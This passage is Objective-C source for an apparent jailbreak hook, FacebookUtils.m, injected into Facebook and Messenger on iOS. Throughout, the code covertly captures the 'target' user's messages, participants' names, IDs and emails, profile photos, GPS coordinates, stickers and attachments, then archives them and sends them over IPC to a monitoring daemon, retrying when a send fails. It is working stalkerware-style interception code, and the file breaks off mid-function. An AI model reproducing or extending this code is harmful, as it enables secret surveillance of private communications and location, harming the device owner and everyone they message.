//
//  FacebookUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "FacebookUtils.h"
#import "FacebookUtilsV2.h"

#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "StringUtils.h"
#import "DateTimeFormat.h"

#import "FBMThread.h"
#import "ThreadMessage.h"
#import "FBMParticipantInfo.h"
#import	"FBMThreadUser.h"
#import "BatchThreadCreator.h"

#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import "SpringBoardServices.h"

#import "ACAccount-FBFoundation.h"
#import "FBAccountStore.h"
#import "UserSettings.h"
#import "FBMThreadMessagesFilter.h"
#import "FBMThreadParticipantFilter.h"
#import "UserSet.h"
#import "FBAuthenticationManagerImpl.h"
#import "FBAuthenticationManagerImpl+601.h" // For Facebook 6.0 and 6.0.1
#import "FBMessengerModuleAuthenticationManager.h"
#import "FBMessengerModuleAuthenticationManager+601.h" // For Facebook 6.0 and 6.0.1
#import "FBMessengerUser.h"
#import "LocationUpdater.h"
#import "FBMStickerStoragePathManager.h"

#import "AudioAttachment.h"
#import "PhotoAttachment.h"
#import "JKDictionary.h"
#import "MessageAttachments.h"
#import "AttachmentURLFormatter.h"

#import "UserSettings.h"
#import "FBMStickerResourceManager.h"
#import "FBMStickerManager.h"
#import "FBMStickerPack.h"
#import "FBMSticker.h"

#import "FBFacebookCredentials.h"
#import "IMShareUtils.h"
// Messenger 2.7 & 2.6
#import "PushedThreadMessage.h"

// Facebook 6.7
#import "FBMMessage.h"
#import "FBMAuthenticationManagerImpl.h"
#import "FBMThreadSet.h"

// Messenger 3.1
#import "FBMAttachmentURLParams.h"
#import "FBMCachedAttachmentURLFormatter.h"
#import "FBMBaseAttachmentURLFormatter.h"

// Messenger 5.0
#import "VideoAttachment.h"

// Facebook 12
#import "FBMMessage+Facebook-12.h"
#import "FBMPushedMessage.h"

// Messenger 21.1
#import "FBMStringWithRedactedDescription.h"

#import <objc/runtime.h>

#define FACEBOOK_INDENTIFIER	@"com.facebook.Facebook"
#define MESSENGER_INDENTIFIER	@"com.facebook.Messenger"

#define USER_ID_KEY				@"userid"
#define USERNAME_KEY			@"username"

NSInteger threadMessageCompare(id aMessage1, id aMessage2, void *aContext) {
	FBMMessage *message1 = aMessage1;
	FBMMessage *message2 = aMessage2;
	
	if ([message1 timestamp] > [message2 timestamp]) {
		return NSOrderedDescending;
	} else if ([message1 timestamp] < [message2 timestamp]) {
		return NSOrderedAscending;
	} else {
		return NSOrderedSame;
	}
}

static FacebookUtils *_FacebookUtils = nil;

@interface FacebookUtils (private)

+ (NSString *) getFrontMostApplication;
- (void) captureFacebookMessage: (NSArray *) aArguments;

- (void) thread: (FxIMEvent *) aIMEvent;					// for IM event

+ (BOOL) isSystemMessage: (ThreadMessage *) aThreadMessage;

- (void) checkHaveAttachment:(NSArray *)aArrayofAttachment;

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
+ (FBMessengerUser *) getMeUser;
+ (NSString *) getUserID;
+ (NSDictionary *) getVoIPContact: (FBMThread *) aFBMThread
						direction: (FxEventDirection) aDirection 
						   meUser: (FBMessengerUser *) aMeUser 
						 senderID: (NSString *) aSenderID;
+ (FxEventDirection) getVoIPDirectionWithMessageText: (NSString *) aMessage 
									   threadMessage: (ThreadMessage *) aThreadMessage 
											  meUser: (FBMessengerUser *) aMeUser
											senderID: (NSString *) aSenderID;
- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent;			// for VoIP event

@end

@implementation FacebookUtils

@synthesize mNumFetchThread, mFBAuthenManagerImpl, mFBMessengerModuleAuthManager, mMessageID, mofflineThreadingId, mAcessToken, mMeUserID;
@synthesize mFBMStickerStoragePathManager, mFBMAuthenticationManagerImpl, mFBMURLRequestFormatter, mFBMThreadSet;
@synthesize mFBMCachedAttachmentURLFormatter, mFBMBaseAttachmentURLFormatter;

@synthesize mIMSharedFileSender, mVOIPSharedFileSender;

+ (id) shareFacebookUtils {
	if (_FacebookUtils == nil) {
		_FacebookUtils = [[FacebookUtils alloc] init];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kFacebookMessagePort];
			[_FacebookUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kFacebookCallLogMessagePort1];
			[_FacebookUtils setMVOIPSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_FacebookUtils);
}

+ (void) sendFacebookEvent: (FxIMEvent *) aIMEvent {
	FacebookUtils *fbUtils = [[FacebookUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:fbUtils withObject:aIMEvent];
	[fbUtils autorelease];
}

+ (NSString *) getFrontMostApplication {
	
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	return frontmostApp;
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"Facebook message after remove emoji = %@", msg);
		if (([msg length]>0) || ([[aIMEvent mAttachments]count]>0) || [aIMEvent mShareLocation] != nil) {
			[aIMEvent setMMessage:msg];
			
			// Capture photo
			NSString * link = [NSString stringWithFormat:@"https://graph.facebook.com/%@/picture", [aIMEvent mUserID]];
			NSURL * urlforPhoto = [NSURL URLWithString:link];
            DLog(@"urlforPhoto for target, %@", urlforPhoto);
			
			/********************************************
				sender picture profile autorelease pool
			 ********************************************/
			NSAutoreleasePool *senderPhotoPool	= [[NSAutoreleasePool alloc] init];			
			NSData * senderPhoto				= [NSData dataWithContentsOfURL:urlforPhoto];
			[aIMEvent setMUserPicture:senderPhoto];			
			[senderPhotoPool drain];
			
			for (FxRecipient *recipient in [aIMEvent mParticipants]) {
				NSString * link = [NSString stringWithFormat:@"https://graph.facebook.com/%@/picture", [recipient recipNumAddr]];
				NSURL * urlforPhoto = [NSURL URLWithString:link];
                DLog(@"urlforPhoto for others, %@", urlforPhoto);
				
				/********************************************
					participant picture profile autorelease pool
				 ********************************************/
				NSAutoreleasePool *participantPhotoPool	= [[NSAutoreleasePool alloc] init];							
				NSData * participantPhoto = [NSData dataWithContentsOfURL:urlforPhoto];
				[recipient setMPicture:participantPhoto];				
				[participantPhotoPool drain];				
			}
            
            // Download attachment actual image/video Messenger 35.0 up
            for (FxAttachment *attachment in [aIMEvent mAttachments]) {
                NSAutoreleasePool *attachmentPool = [[NSAutoreleasePool alloc] init];
                
                NSString *urlOfActual = [attachment fullPath];
                if (urlOfActual &&
                    ([urlOfActual rangeOfString:@"http://"].location != NSNotFound ||
                    [urlOfActual rangeOfString:@"https://"].location != NSNotFound)) {
                    
                    NSURL *url = [NSURL URLWithString:urlOfActual];
                    NSData *actualData = [NSData dataWithContentsOfURL:url];
                    
                    NSString *urlOfThumbnail = [[[NSString alloc] initWithData:[attachment mThumbnail] encoding:NSUTF8StringEncoding] autorelease];
                    NSURL *url2 = [NSURL URLWithString:urlOfThumbnail];
                    NSData *thumbnailData = [NSData dataWithContentsOfURL:url2];
                    
                    if (actualData && thumbnailData) {
                        NSString *lastPath = [url lastPathComponent];
                        DLog(@"lastPathComponent, %@", lastPath);
                        NSString *fbAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
                        fbAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", fbAttachmentPath, [[NSDate date] timeIntervalSince1970], lastPath];
                        
                        if (![actualData writeToFile:fbAttachmentPath atomically:YES]) {
                            // iOS 9, Sandbox
                            fbAttachmentPath = [IMShareUtils saveData:actualData toDocumentSubDirectory:@"/attachments/imFacebook/" fileName:[fbAttachmentPath lastPathComponent]];
                        }
                        
                        [attachment setFullPath:fbAttachmentPath];
                        [attachment setMThumbnail:thumbnailData];
                    } else {
                        NSString *pathExtension = [url pathExtension];
                        DLog(@"pathExtension, %@", pathExtension);
                        if ([pathExtension isEqualToString:@"jpg"] ||
                            [pathExtension isEqualToString:@"jpeg"] ||
                            [pathExtension isEqualToString:@"png"] ||
                            [pathExtension isEqualToString:@"gif"]) {
                            [attachment setFullPath:@"image/jpeg"];
                        } else {
                            [attachment setFullPath:@"video/mp4"];
                        }
                        [attachment setMThumbnail:nil];
                    }
                }
                
                [attachmentPool drain];
            }
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
			NSDictionary *fbInfo = [[NSDictionary alloc] initWithObjectsAndKeys:bundleIdentifier, @"bundle",
									aIMEvent, @"IMEvent", nil];
			[archiver encodeObject:fbInfo forKey:kFacebookArchied];
			[archiver finishEncoding];
			[fbInfo release];
			[archiver release];	
			
			BOOL successfullySend = NO;
			successfullySend = [FacebookUtils sendDataToPort:data portName:kFacebookMessagePort];
			
			DLog (@"===========================================================")
			DLog (@"************ {1} successfullySend = %d", successfullySend);
			DLog (@"===========================================================")
            
            if (!successfullySend) {
                [NSThread sleepForTimeInterval:5.0];
                successfullySend = [FacebookUtils sendDataToPort:data portName:kFacebookMessagePort];
                
                DLog (@"===========================================================")
                DLog (@"************ {2} successfullySend = %d", successfullySend);
                DLog (@"===========================================================")
            }
            
            if (!successfullySend) {
                [NSThread sleepForTimeInterval:10.0];
                successfullySend = [FacebookUtils sendDataToPort:data portName:kFacebookMessagePort];
                
                DLog (@"===========================================================")
                DLog (@"************ {3} successfullySend = %d", successfullySend);
                DLog (@"===========================================================")
            }
			
			if (!successfullySend) {
				[self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
			}
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

#pragma mark -
#pragma mark Message and outgoing attachment capture
#pragma mark -

+ (void) captureFacebookMessage: (FBMThread *) aFBMThread message: (ThreadMessage *) aThreadMessage {

	DLog (@"[aFBMthread class] = %@, aFBMThread = %@", [aFBMThread class], aFBMThread);
	DLog (@"[aThreadMessage class] = %@, aThreadMessage	= %@", [aThreadMessage class], aThreadMessage);
	
	/*************************************************************************************************************************
	 NOTE:
     - Facebook 6.7, class ThreadMessage is rename to FBMMessage, luckily most
	 of the methods name of new class are the same as the old one
     - Facebook 12, Messenger 7.1, class ThreadMessage is rename to FBMPushedMessage inherit from FBMMessage, luckily most
	 of the methods name of new class are the same as the old one
	 *************************************************************************************************************************/

	if ([FacebookUtils isVoIPMessage:aThreadMessage withThread:aFBMThread]) {
		DLog (@"Not capture Free Call Message as IM Event")
		return;
	}
		
	NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
	
	FBMThread *fbmThread = aFBMThread;
	ThreadMessage *threadMessage = aThreadMessage;
	
	
	/****************************************************************************
	 CASE 1: Text ONLY
		the text variable contains the message that user type
	 CASE 2: Text with attachment
		the text contains the description of the photo that user types
	 CASE 3: Attachment only
		the text contains the text that system generates, e.g., Ben sent sticer.
		However, it possible that this text will be empty
	 *****************************************************************************/
	NSString *message = [threadMessage text];
	
    /*
     senderInfo property is deprecated in Facebook 12 and Messenger 7.1 onward
     */
	NSString *senderId = nil;
    if ([threadMessage respondsToSelector:@selector(senderInfo)]) {
        senderId = [(FBMParticipantInfo*)[threadMessage senderInfo] userId]; // 100001619597136
    } else {
        senderId = [(FBMPushedMessage *)threadMessage senderId];
    }
	
	/*
	 Got "TODO" when messenger is not running (user kill messenger) 
	 -> message received via push notification
	 -> user click to open message
	 -> got null/TODO instead of 100001619597136@facebook.com
	*/
	NSString *email = nil;
    if ([threadMessage respondsToSelector:@selector(senderInfo)]) {
        email = [(FBMParticipantInfo*)[threadMessage senderInfo] email];
    }
	NSString *userDisplayName = nil;
	NSString *imServiceId = @"fbk";
	NSString *messageId = [threadMessage messageId];
	NSString *offlineThreadingId = [threadMessage offlineThreadingId];
	int direction = kEventDirectionUnknown;
	NSMutableArray *fxParticipants = [NSMutableArray array];
	
	DLog (@"---------------------------------------------------");
	DLog (@"message =====> %@", message)	
	DLog (@"threadMessage = %@", threadMessage);
    if ([threadMessage respondsToSelector:@selector(senderInfo)]) {DLog (@"senderInfo = %@", [threadMessage senderInfo]);}
	DLog (@"sendState = %d", [threadMessage sendState]);
	DLog (@"actionId = %lld", [threadMessage actionId]);
	DLog (@"source = %d", [threadMessage source]);
    if ([threadMessage respondsToSelector:@selector(shareMap)]) {
        DLog (@"shareMap = %@", [threadMessage shareMap]);
    }
    DLog (@"logMessage = %@", [threadMessage logMessage]);
    DLog (@"adminSnippet = %@", [threadMessage adminSnippet]);
    DLog (@"tags = %@", [threadMessage tags]);
	DLog (@"---------------------------------------------------");
	
	FBAuthenticationManagerImpl *fbAuthenManagerImpl = nil;
	fbAuthenManagerImpl = [[FacebookUtils shareFacebookUtils] mFBAuthenManagerImpl];
	
	//==================================== mailboxViewer Facebook 6.0.1
	// For Facebook 6.0.1
	
	FBMessengerModuleAuthenticationManager *fbMessengerModuleAuthManager = nil;
	fbMessengerModuleAuthManager = [[FacebookUtils shareFacebookUtils] mFBMessengerModuleAuthManager];
	
	FBMessengerUser *meUser = nil;
	
	if ([fbAuthenManagerImpl respondsToSelector:@selector(mailboxViewer)] ||
		[fbMessengerModuleAuthManager respondsToSelector:@selector(mailboxViewer)]) {
		
		 meUser = [fbAuthenManagerImpl mailboxViewer]; // Messenger
		
		if (meUser == nil) {
			meUser = [fbMessengerModuleAuthManager mailboxViewer]; // Facebook
		
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMailboxViewer];
				meUser = [fbMessengerModuleAuthManager mailboxViewer];
				DLog (@"[1] meUser from prepare = %@", meUser);
			}
		}
		
	
	}
	// For Facebook Messenger 2.3.1 and Facebook version ealier than 6.0 and 6.0.1
	else {
		
		meUser = [fbAuthenManagerImpl meUser]; // Messenger
		
		if (meUser == nil) {
			meUser = [fbMessengerModuleAuthManager meUser]; // Facebook
			
			if (meUser == nil) {
				[fbMessengerModuleAuthManager prepareMeUser];
				meUser = [fbMessengerModuleAuthManager meUser];
				DLog (@"[2] meUser from prepare = %@", meUser);
			}
		}
	}
	
	DLog (@"meUser = %@", meUser);
	[meUser retain];
	
	NSString *meUserId = nil;
	if (meUser == nil) {
		// Try to get meUser in Facebook 6.7
		FBMAuthenticationManagerImpl *fbmAuthenticationManagerImpl = [[self shareFacebookUtils] mFBMAuthenticationManagerImpl];
		meUserId = [NSString stringWithString:[fbmAuthenticationManagerImpl mailboxViewerUserID]];
	} else {
		// Older version of Facebook and Messenger (up to 2.7)
		meUserId = [NSString stringWithString:[meUser userId]];
	}
	DLog (@"meUserId = %@", meUserId);
	
	//==================================== mailboxViewer Facebook 6.0.1
	// ---- end fix crash
	
	// Identify Direction
	if ([senderId isEqualToString:meUserId]) { // If the sender is target device ==> outgoing
		direction = kEventDirectionOut;
	} else {
		direction = kEventDirectionIn;
	}
	
	NSMutableArray *finalParticipants = [NSMutableArray array];
	
	NSArray *origParticipants = [fbmThread participants]; // All party concerned including target
	NSMutableArray *tempParticipants = [[NSMutableArray alloc] initWithArray:origParticipants];
	DLog (@"origParticipants = %@", origParticipants)
	
	// 1. Only incoming directiom, find target account -> 
	//	create FxRecipient from target account -> add to index 0 of finalParticipants
	// 2. Find sender account -> remove sender from participants list
	
	NSData * myPhoto = nil;
	NSData * participantPhoto = nil;
	NSData * senderPhoto = nil;
	
	for (int i=0; i < [origParticipants count]; i++) {
		FBMParticipantInfo *participantInfo = nil;
		id object = [origParticipants objectAtIndex:i];
		DLog (@"First query: [object class] = %@, object = %@", [object class], object)
		
		// Fixed how to get participants in Faceook 6.7
		Class $FBMThreadUser = objc_getClass("FBMThreadUser");
		if ([object isKindOfClass:$FBMThreadUser]) { // Facebook 6.5 downward, Messenger 2.7 downward
			FBMThreadUser *user = object;
			participantInfo = [user participantInfo];
		} else {
			participantInfo = object;
		}
		
		//NSString * userName = [[participantInfo name] stringByReplacingOccurrencesOfString:@" " withString:@"."];
		//NSString * myLink = [NSString stringWithFormat:@"http://graph.facebook.com/%@/picture",[participantInfo userId]];
		//NSURL * urlforPhoto = [NSURL URLWithString:myLink];
		
		DLog(@"------- FBMParticipantInfo -----------");
		DLog (@"email = %@", [participantInfo email]);
		DLog (@"userId = %@", [participantInfo userId]);
		DLog (@"name = %@", [participantInfo name]);
		DLog (@"readReceiptMessageId = %@", [participantInfo readReceiptMessageId]);
		DLog(@"------- FBMParticipantInfo -----------");
		
		if ([senderId isEqualToString: [participantInfo userId]] ){
			//Capture senderPhoto
			//senderPhoto = [NSData dataWithContentsOfURL:urlforPhoto];
			//DLog(@"***** urlforPhoto %@",urlforPhoto);
			//DLog(@"***** senderPhoto %@",senderPhoto);
		}
		
		// 1.
		if (direction == kEventDirectionIn								&&
			[[participantInfo userId] isEqualToString:meUserId]	) {
			
			[tempParticipants removeObject:object];
			
			//Capture myPhoto
			//NSString * userName = [[participantInfo name] stringByReplacingOccurrencesOfString:@" " withString:@"."];
			//NSString * myLink = [NSString stringWithFormat:@"http://graph.facebook.com/%@/picture",[participantInfo userId]];
			//NSURL * urlforPhoto = [NSURL URLWithString:myLink];
			//myPhoto = [NSData dataWithContentsOfURL:urlforPhoto];
			
			FxRecipient *participant = [[FxRecipient alloc] init];
			//[participant setRecipNumAddr:[participantInfo email]];
			[participant setRecipNumAddr:[participantInfo userId]];
			[participant setRecipContactName:[participantInfo name]];
			[participant setMPicture:myPhoto];
			[finalParticipants addObject:participant];
			[participant release];
			
			//DLog(@"***** urlforPhoto %@",urlforPhoto);
			//DLog(@"***** myPhoto %@",myPhoto);
		}
		
		// 2.
		if ([[participantInfo userId] isEqualToString:senderId]) {
			
			userDisplayName = [participantInfo name];
			email = [participantInfo email];
			[tempParticipants removeObject:object];
			
		}
	}
	
	[meUser release];
	
	DLog (@"Finish querying the sender of this message");
	
	for (id object in tempParticipants) {
		FBMParticipantInfo *participantInfo = nil;
		
		DLog (@"Second query: [object class] = %@, object = %@", [object class], object)
		
		Class $FBMThreadUser = objc_getClass("FBMThreadUser");
		if ([object isKindOfClass:$FBMThreadUser]) { // Facebook 6.5 downward, Messenger 2.7 downward
			FBMThreadUser *user = object;
			participantInfo = [user participantInfo];
		} else {
			participantInfo = object;
		}
		
		// Fixed how to get participant info in Facebook 6.7
		DLog(@"------- participantInfo -----------");
		DLog(@"userId = %@,", [participantInfo userId]);
		DLog(@"email = %@", [participantInfo email]);
		DLog(@"name = %@", [participantInfo name]);
		DLog(@"readReceiptTimestamp = %lld", [participantInfo readReceiptTimestamp]);
		DLog(@"readReceiptMessageId = %@", [participantInfo readReceiptMessageId]);
		DLog(@"isUser = %d", [participantInfo isUser]);
		DLog(@"isEmailUser = %d", [participantInfo isEmailUser]);
		DLog(@"getKey = %@", [participantInfo getKey]);
		DLog(@"JSONString = %@", [participantInfo JSONString]);
		DLog(@"------- participantInfo -----------");
		
		//Capture participantPhoto
		//NSString * userName = [[participantInfo name] stringByReplacingOccurrencesOfString:@" " withString:@"."];
		//NSString * myLink = [NSString stringWithFormat:@"http://graph.facebook.com/%@/picture",[participantInfo userId]];
		//NSURL * urlforPhoto = [NSURL URLWithString:myLink];
		//participantPhoto = [NSData dataWithContentsOfURL:urlforPhoto];
		
		FxRecipient *participant = [[FxRecipient alloc] init];
		//[participant setRecipNumAddr:[participantInfo email]];
		[participant setRecipNumAddr:[participantInfo userId]];
		[participant setRecipContactName:[participantInfo name]];
		[participant setMPicture:participantPhoto];
		[finalParticipants addObject:participant];
		[participant release];
		
		//DLog(@"***** urlforPhoto %@",urlforPhoto);
		//DLog(@"***** participantPhoto %@",participantPhoto);
	}
	fxParticipants = finalParticipants;
	[tempParticipants release];
	
	NSString *conversationID = [fbmThread threadId];
	NSString *conversationName = [fbmThread name];
	
	// Calulate name of conversation
	if (conversationName == nil) {
		if ([fxParticipants count] <= 1) { // Never less than 1 otherwise bug
			if (direction == kEventDirectionOut) { // Out
				conversationName = [[fxParticipants objectAtIndex:0] recipContactName];
			} else { // In
				conversationName = userDisplayName;
			}
		} else {
			NSMutableArray *names = [[NSMutableArray alloc] init];
			if (direction == kEventDirectionOut) { // Out
				for (FxRecipient *participant in fxParticipants) {
					[names addObject:[participant recipContactName]];
				}
			} else { // In
				[names addObject:userDisplayName];
				for (NSInteger i = 1; i < [fxParticipants count]; i++) { // Not include the target account
					[names addObject:[[fxParticipants objectAtIndex:i] recipContactName]];
				}
			}
			conversationName = [names componentsJoinedByString:@","];
			[names release];
		}
	}
	
	DLog (@"---------------------------------------------------");
	DLog(@"mDirection->%d", direction);
	DLog(@"mUserID1->%@", senderId);
	DLog(@"mUserID2(email)->%@", email);
	DLog(@"mParticipants->%@", fxParticipants);
	DLog(@"mIMServiceID->%@", imServiceId);
	DLog(@"mMessage->%@", message);
	DLog(@"mUserDisplayName->%@", userDisplayName);
	
	DLog (@"mConversationID->%@", conversationID);
	DLog (@"mConversationName->%@", conversationName);
	DLog (@"messageId -> %@", messageId);
	DLog (@"offlineThreadingId -> %@", offlineThreadingId);
	DLog (@"---------------------------------------------------");
	
	
	/****************************************************************************
									Initiate FxIMEvent
	 *****************************************************************************/
	FxIMEvent *imEvent = [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	//[imEvent setMUserID:email];
	[imEvent setMUserID:senderId];
	[imEvent setMDirection:(FxEventDirection)direction];
	[imEvent setMIMServiceID:imServiceId];
	[imEvent setMMessage:message];							// --> set MESSAGE
	[imEvent setMRepresentationOfMessage:kIMMessageText];
	[imEvent setMUserDisplayName:userDisplayName];
	[imEvent setMParticipants:finalParticipants];
	[imEvent setMUserPicture:senderPhoto];
	
	// New fields ...
	[imEvent setMServiceID:kIMServiceFacebook];
	[imEvent setMConversationID:conversationID];
	[imEvent setMConversationName:conversationName];
	
	// -- LOCATION -------------------------------------------------------------
	float accuracy = 0.0;
	float latitude = 0.0;
	float longitude = 0.0;
	NSDictionary *coordinates = [threadMessage coordinates];
	if (coordinates == nil && direction == kEventDirectionOut) {
		//Class $LocationUpdater = objc_getClass("LocationUpdater");
		//LocationUpdater *locationUpdater = [$LocationUpdater locationUpdaterWithDesiredAccuracy:65.0]; // 65.0 is magic number from test result
		//id lastGoodLocation = [locationUpdater lastGoodLocation];
		
		//DLog (@"------------------ What is lastGoodLocation class? -----------------");
		//DLog (@"$LocationUpdater = %@", $LocationUpdater);
		//DLog (@"locationUpdater = %@", locationUpdater);
		//DLog (@"[lastGoodLocation class] = %@", [lastGoodLocation class]);
		//DLog (@"lastGoodLocation = %@", lastGoodLocation);
		//DLog (@"------------------ What is lastGoodLocation class? -----------------");
	} else {
		accuracy = [[coordinates objectForKey:@"accuracy"] floatValue];
		latitude = [[coordinates objectForKey:@"latitude"] floatValue];
		longitude = [[coordinates objectForKey:@"longitude"] floatValue];
	}
	
	FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
	[location setMLongitude:longitude];
	[location setMLatitude:latitude];
	[location setMHorAccuracy:accuracy];
	[imEvent setMUserLocation:location];
	[location release];
	
	DLog (@"---------------------------------------------------");
	DLog (@"coordinates = %@", coordinates);
	DLog (@"longitude->%f", longitude);
	DLog (@"latitude->%f", latitude);
	DLog (@"accuracy->%f", accuracy);
	DLog (@"---------------------------------------------------");
	
	// Utils fields...
	[imEvent setMMessageIdOfIM:messageId];
 	[imEvent setMOfflineThreadId:offlineThreadingId];
	
	NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
		
	DLog(@"************** attachments %@, %@",[threadMessage class],[threadMessage attachmentMap]);
	DLog(@"************** outgoingAttachments %@",[threadMessage outgoingAttachments]);
	DLog(@"*** adminText: %@ text: %@", [threadMessage adminText], [threadMessage text]);
	if ([threadMessage respondsToSelector:@selector(getStickerFbId)]) {DLog(@"getStickerFbId = %llu", [threadMessage getStickerFbId]);}
    if ([threadMessage respondsToSelector:@selector(getSticker)]) {DLog(@"getSticker = %@", [threadMessage getSticker]);}
	
	/***************************************************************
		OUTGOING Attachment
	 ***************************************************************/
	// Add Attachment Outgoing 	
	if (direction == kEventDirectionOut) {
		
		/***********************************************************
		 For outgoing message sent from pc version, no attachment		 
		 ***********************************************************/
		if ([[threadMessage outgoingAttachments]count] > 0				||		// For the case that the attachment has been sent from the device
			[[threadMessage adminText] length] != 0						||		// For the case that the attachment has been sent from PC version
			([threadMessage respondsToSelector:@selector(getStickerFbId)] && [threadMessage getStickerFbId]>0)) {	// For the case of sticker
			
			NSMutableArray *attachments = [[NSMutableArray alloc] init];
			//Add Sticker Outgoing
			if([threadMessage respondsToSelector:@selector(getStickerFbId)]){
				if([threadMessage getStickerFbId]>0){
					[imEvent setMRepresentationOfMessage:kIMMessageSticker];
					DLog(@"****** Have Outgoing  Sticker ID is %llu ",[threadMessage getStickerFbId]);
						
					NSString * path = nil;
					Class $FBMStickerResourceManager = objc_getClass("FBMStickerResourceManager");
					//look at messager app inside library -> application support -> stickers
					
					NSString *stickerRootDirectoryPath = nil;
					if ([$FBMStickerResourceManager respondsToSelector:@selector(stickerRootDirectoryPath)]) {
						//For Facebook Messager Version 2.5
						stickerRootDirectoryPath = [$FBMStickerResourceManager stickerRootDirectoryPath];
					} else {
						//For Facebook Messager Version 2.6
						FBMStickerStoragePathManager *stickerStoragePathManager = [[FacebookUtils shareFacebookUtils] mFBMStickerStoragePathManager];
						stickerRootDirectoryPath = [stickerStoragePathManager stickerRootDirectoryPath];
					}
					
					if ([threadMessage respondsToSelector:@selector(getSticker)]) {
						DLog(@"-------> Searching sticker at path = %@", stickerRootDirectoryPath);
						int foldercount = 9; // As Bill mentions, there is no more than 10 folder in stickerRootDirectoryPath (v2.5)
						for(int i = 0 ; i <= foldercount;i++){
							NSFileManager * fileManagerinsideloop = [NSFileManager defaultManager];
							path = [NSString stringWithFormat:@"%@/%d/sticker_%llu.png",stickerRootDirectoryPath,i,[threadMessage getStickerFbId]];
							if([fileManagerinsideloop fileExistsAtPath:path]){
								DLog(@"*********** Found Sticker Location ");
								break;
							}
						}
					}else{
						DLog(@"-------> in version below 2.5 for messager");
						Class $UserSettings			= objc_getClass("UserSettings");
						UserSettings * settting		= [$UserSettings sharedInstance];
						
						Class $FBMStickerManager	= objc_getClass("FBMStickerManager");
						FBMStickerManager * manager = [[$FBMStickerManager alloc]initWithUserSettings:settting];
						
						FBMSticker * fbmStickerpack		= [manager stickerWithFbId:[threadMessage getStickerFbId]];
						path = [NSString stringWithFormat:@"%@/%llu/sticker_%llu.png",stickerRootDirectoryPath,[fbmStickerpack stickerPackFbId],[threadMessage getStickerFbId]];
						
						[manager release];
					}
					
					NSFileManager * fileManager = [NSFileManager defaultManager];
					
					NSString * defaultpath = [NSString stringWithFormat:@"%@/FBMessengerApp.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[threadMessage getStickerFbId]];
					if (![fileManager fileExistsAtPath:defaultpath]) {
						// Facebook 6.6
						defaultpath = [NSString stringWithFormat:@"%@/FBMessenger.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[threadMessage getStickerFbId]];
                        if (![fileManager fileExistsAtPath:defaultpath]) {
                            // Messenger 8.0 for iPad
                            defaultpath = [NSString stringWithFormat:@"%@/FBStickersKit.bundle/sticker_items/sticker_%llu.png",[[NSBundle mainBundle] resourcePath],[threadMessage getStickerFbId]];
                        }
					}
					NSString * otherpath =  [NSString stringWithFormat:@"%@/others/sticker_%llu.png",stickerRootDirectoryPath,[threadMessage getStickerFbId]];
					DLog (@"Outgoing-Default sticker path	= %@", defaultpath)
					DLog (@"Outgoing-Other sticker path		= %@", otherpath)
					DLog (@"Outgoing-Download sticker path	= %@", path)
					
					/********************************************
						sticker autorelease pool
					 ********************************************/
					NSAutoreleasePool *stickerPool = [[NSAutoreleasePool alloc] init];					
					
					NSData * datatowrite = nil;
					
					if([fileManager fileExistsAtPath:path]){
						DLog(@"*** path %@",path);
						UIImage *image = [UIImage imageWithContentsOfFile:path];
						datatowrite = UIImagePNGRepresentation(image);
					}else{
						if([fileManager fileExistsAtPath:defaultpath]){
							DLog(@"*** defaultpath %@",defaultpath);
							UIImage *image = [UIImage imageWithContentsOfFile:defaultpath];
							datatowrite = UIImagePNGRepresentation(image);	
						}else if([fileManager fileExistsAtPath:otherpath]){
							DLog(@"*** otherpath %@",otherpath);
							UIImage *image = [UIImage imageWithContentsOfFile:otherpath];
							datatowrite = UIImagePNGRepresentation(image);	
						}
					}
					if(datatowrite != nil){
						DLog(@"********************* Write Data");
						FxAttachment *attachment = [[FxAttachment alloc] init];	
						[attachment setMThumbnail:datatowrite];
						[attachments addObject:attachment];			
						[attachment release];
					}else{
						DLog(@"********************* Data Lost");
					}	
					
					[stickerPool drain];
				}
			}
			
			//Outgoing Attachment Facebook and Messenger
			NSString* facebookAttachmentPath=@"";
